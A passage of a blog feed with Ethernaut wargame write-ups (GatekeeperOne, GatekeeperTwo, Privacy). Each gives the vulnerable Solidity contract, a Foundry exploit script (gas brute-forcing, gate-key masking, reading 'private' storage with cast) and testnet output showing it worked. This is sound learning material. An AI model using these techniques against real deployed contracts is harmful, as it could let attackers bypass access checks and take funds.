class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)))))</span> <span class=\"o\">^</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"n\">gateKey</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperTwoSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperTwo</span> <span class=\"k\">public</span> <span class=\"n\">gkt_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperTwo</span><span class=\"p\">(</span><span class=\"mh\">0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">gkt_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 26 files with Solc 0.8.29<span class=\"o\">[</span>‚†Ü] Compiling 4 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>42.16ms<span class=\"o\">[</span>‚†ò] Solc 0.8.29 finished <span class=\"k\">in </span>335.40msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex <span class=\"o\">=</span> new Ex<span class=\"o\">(</span>gkt_<span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used <span class=\"k\">for </span>script: 135274Estimated amount required: 0.00000014512600542 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH <span class=\"o\">(</span>104057 gas <span class=\"k\">*</span> 0.001072822 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-28-GateKeeperTwo/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","assembly","extcodesize","XOR"],
            
            "date_published": "2025-04-28T00:00:00+09:00",
            "date_modified": "2025-04-28T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            "title": "[Ethernaut] 13.GateKeeper One",
            "summary": null,
            "content_text": "AnalysisThe goal is  Make it past the gatekeeper and register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        require(gasleft() % 8191 == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}Solidity 0.8.30 Documentation - units and global variables  üí° gasleft()¬†returns¬†(uint256): remaining gasSolidity 0.8.30 Documentation - external function calls  üí° When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options¬†{value:¬†10,¬†gas:¬†10000}. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperOne.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    function ex(GatekeeperOne gko_) external returns (uint){        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;        for(uint i=0; i&lt;=350; i++) {            (bool result,) = address(gko_).call{gas: i+(8191*3)}(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));            if(result) {                return i;            }        }    }}contract GateKeeperOneSol is Script {    GatekeeperOne public gko_ = GatekeeperOne(0x8905857EFf6E619C391C6a828B62F86f2D15CCf8);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gko_.entrant());        Ex ex = new Ex();        console.log(\"gas: \", ex.ex(gko_));        console.log(\"After entrant: \", gko_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperOneSol.sol --tc GateKeeperOneSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used for script: 987058Estimated amount required: 0.000001003572467398 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH (427697 gas * 0.001016724 gwei)##### holesky‚úÖ  [Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH (278117 gas * 0.001016724 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Make it past the gatekeeper and register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperOne</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"nb\">gasleft</span><span class=\"p\">()</span> <span class=\"o\">%</span> <span class=\"mi\">8191</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">!=</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/units-and-global-variables.html\">Solidity 0.8.30 Documentation - units and global variables</a></p><blockquote>  <p>üí° <code class=\"language-plaintext highlighter-rouge\">gasleft()¬†returns¬†(uint256)</code>: remaining gas</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls\">Solidity 0.8.30 Documentation - external function calls</a></p><blockquote>  <p>üí° When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options¬†<code class=\"language-plaintext highlighter-rouge\">{value:¬†10,¬†gas:¬†10000}</code>. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperOne.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">GatekeeperOne</span> <span class=\"n\">gko_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint</span><span class=\"p\">){</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)))</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xFFFFFFFF0000FFFF</span><span class=\"p\">;</span>        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kt\">uint</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"mi\">350</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">gas</span><span class=\"o\">:</span> <span class=\"n\">i</span><span class=\"o\">+</span><span class=\"p\">(</span><span class=\"mi\">8191</span><span class=\"o\">*</span><span class=\"mi\">3</span><span class=\"p\">)}(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"enter(bytes8)\"</span><span class=\"p\">,</span> <span class=\"n\">gateKey</span><span class=\"p\">));</span>            <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"p\">;</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperOneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperOne</span> <span class=\"k\">public</span> <span class=\"n\">gko_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperOne</span><span class=\"p\">(</span><span class=\"mh\">0x8905857EFf6E619C391C6a828B62F86f2D15CCf8</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"gas: \"</span><span class=\"p\">,</span> <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperOneSol.sol <span class=\"nt\">--tc</span> GateKeeperOneSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used <span class=\"k\">for </span>script: 987058Estimated amount required: 0.000001003572467398 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH <span class=\"o\">(</span>427697 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH <span class=\"o\">(</span>278117 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-22-GateKeeper-One/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-22T00:00:00+09:00",
            "date_modified": "2025-04-22T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/privacy",
            "title": "[Ethernaut] 12.Privacy",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock this contract// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy {    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) {        data = _data;    }    function unlock(bytes16 _key) public {        require(_key == bytes16(data[2]));        locked = false;    }    /*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */}Exploit$ cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e// SPDX-License-Ideifier: MITpragma solidity ^0.8.0;import \"../src/Privacy.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract PrivacySol is Script {    Privacy public privacy_ = Privacy(0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        bytes32 key = 0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e;        console.log(\"Befor locked: \", privacy_.locked());        privacy_.unlock(bytes16(key));        console.log(\"After locked: \", privacy_.locked());        vm.stopBroadcast();    }}$ forge script script/PrivacySol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Befor locked:  true  After locked:  false## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used for script: 35136Estimated amount required: 0.000000125458850304 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH (24025 gas * 0.003570656 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock this contract</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Privacy</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">ID</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">flattening</span> <span class=\"o\">=</span> <span class=\"mi\">10</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">denomination</span> <span class=\"o\">=</span> <span class=\"mi\">255</span><span class=\"p\">;</span>    <span class=\"kt\">uint16</span> <span class=\"k\">private</span> <span class=\"n\">awkwardness</span> <span class=\"o\">=</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">);</span>    <span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">private</span> <span class=\"n\">data</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">memory</span> <span class=\"n\">_data</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">_data</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span> <span class=\"n\">_key</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">_key</span> <span class=\"o\">==</span> <span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]));</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</code></pre></div></div><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Ideifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Privacy.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">PrivacySol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Privacy</span> <span class=\"k\">public</span> <span class=\"n\">privacy_</span> <span class=\"o\">=</span> <span class=\"n\">Privacy</span><span class=\"p\">(</span><span class=\"mh\">0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">bytes32</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"mh\">0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</span><span class=\"p\">;</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/PrivacySol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  